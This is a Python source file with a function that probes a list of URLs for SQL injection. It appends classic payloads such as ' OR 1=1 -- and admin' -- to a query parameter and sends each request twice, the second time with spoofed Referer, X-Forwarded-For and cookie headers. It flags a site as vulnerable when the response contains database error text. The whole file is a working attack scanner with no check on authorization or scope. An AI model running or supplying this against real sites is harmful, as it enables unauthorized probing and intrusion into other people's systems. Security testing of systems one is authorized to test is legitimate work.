from tqdm import tqdm
import requests

def scan_sql_injection(urls):
    """
    Check URLs for SQL injection vulnerabilities.
    """
    print("[*] Starting SQL Injection scan...")
    vulnerable = []
    payloads = [
        "'",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR '1'='1",
        "admin' --"
        
    ]

    # Additional headers to simulate different client behaviors
    additional_headers = {
        "Referer": "http://example.com",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Forwarded-For": "127.0.0.1",
        "Cookie": "sessionid=123456; csrf_token=abcdef"
    }

    # Progress bar for URLs
    with tqdm(total=len(urls), desc="Scanning URLs", unit="url") as progress_bar:
        for url in urls:
            sanitized_url = url.rstrip('/')  # Ensure URL formatting consistency
            is_vulnerable = False

            for payload in payloads:
                full_url = f"{sanitized_url}?input={payload}"  # Use query parameter format for payload injection

                # First attempt without additional headers
                try:
                    response = requests.get(full_url, timeout=5, headers={"User-Agent": "SQLInjector/1.1"})

                    # Check for SQL error indicators in the response
                    error_keywords = ["syntax error", "mysql", "sql", "database", "unclosed quotation mark"]
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        print(f"[!] Vulnerable: {sanitized_url} (Payload: {payload})")
                        vulnerable.append(sanitized_url)
                        is_vulnerable = True
                        break  # Stop testing other payloads for this URL

                except requests.exceptions.Timeout:
                    print(f"[!] Timeout occurred while connecting to {sanitized_url}")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Failed to connect to {sanitized_url}: {e}")

                # If not vulnerable, retry with additional headers
                if not is_vulnerable:
                    try:
                        headers = {"User-Agent": "SQLInjector/1.1", **additional_headers}
                        response = requests.get(full_url, timeout=5, headers=headers)

                        # Check again for SQL error indicators in the response
                        if any(keyword in response.text.lower() for keyword in error_keywords):
                            print(f"[!] Vulnerable: {sanitized_url} (Payload: {payload}, With Additional Headers)")
                            vulnerable.append(sanitized_url)
                            is_vulnerable = True
                            break  # Stop testing other payloads for this URL

                    except requests.exceptions.Timeout:
                        print(f"[!] Timeout occurred while connecting to {sanitized_url} (With Additional Headers)")
                    except requests.exceptions.RequestException as e:
                        print(f"[!] Failed to connect to {sanitized_url} (With Additional Headers): {e}")

            # Update the progress bar
            progress_bar.update(1)

            if is_vulnerable:
                continue  # Skip further checks for this URL if it's already marked vulnerable

    print("[\u2713] SQL Injection scan completed.")
    return vulnerable
